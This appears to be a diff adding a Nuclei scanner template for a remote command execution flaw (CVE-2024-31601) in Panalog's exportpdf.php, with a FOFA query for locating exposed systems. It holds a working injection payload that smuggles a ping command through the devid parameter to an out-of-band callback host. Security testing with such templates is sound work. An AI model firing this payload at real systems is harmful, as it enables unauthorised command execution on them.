@@ -1,0 +1,29 @@
+id: panalog-log-audit-command-execution
+info:
+  name: "Panalog 大数据日志审计系统 exportpdf.php 远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="Panabit-Panalog"
+      漏洞源于目标系统未正确校验用户输入参数，攻击者可构造恶意请求在目标服务器上执行任意系统命令。该缺陷允许远程攻击者在未授权情况下获取系统控制权，建议通过FOFA语法定位受影响资产并及时修复。
+  reference:
+  - CVE-2024-31601
+  tags: Panalog
+http:
+- raw:
+  - |
+    POST /Maintain/exportpdf.php HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: PHPSESSID=4dkc7q5hu7lkdlsfm5a0tcirn6
+    Content-Type: application/x-www-form-urlencoded
+
+    devid=';ping {{interactsh-url}};
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
